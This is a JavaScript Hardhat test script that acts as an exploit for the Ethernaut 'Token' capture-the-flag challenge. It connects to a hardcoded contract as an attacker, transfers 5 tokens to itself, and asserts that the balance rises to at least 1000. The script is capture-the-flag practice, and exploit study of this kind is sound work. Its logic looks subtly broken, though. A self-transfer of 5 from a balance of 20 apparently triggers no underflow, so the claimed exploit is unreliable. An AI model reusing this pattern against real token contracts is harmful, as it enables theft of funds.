const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Token Exploit using EOA", function () {
  let tokenContract, attacker, contractAddress, balance;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x1A29F26fecbcE388e692beE4E5BA43A871aB0C15"; // insert contract address of ethernaut challenge
    tokenContract = await ethers.getContractAt("Token", contractAddress);

    console.log(`token contract connected`);
  });

  it("perform exploit", async function () {
    // Attack flow
    // 1) I want to see the balance of my attacker address should = 20

    let originalBalance = await tokenContract.balanceOf(attacker.address);

    console.log(`The original balance is ${originalBalance}`);
    // 2) we want to call the transfer function and list our own address as the _to address
    let txTransfer = await tokenContract.transfer(attacker.address, 5);

    let receiptTxTransfer = await txTransfer.wait();

    console.log(
      `The transfer tx is ${txTransfer} and the receipt is ${receiptTxTransfer}`
    );
    // 3) Grab the balance of my attacker address after the malicious transaction is called

    balance = await tokenContract.balanceOf(attacker.address);
  });

  after("confirm exploit", async function () {
    // 4) confirming that we received way more than the original 20 we are allocated
    expect(balance).to.be.gte("1000");
  });
});
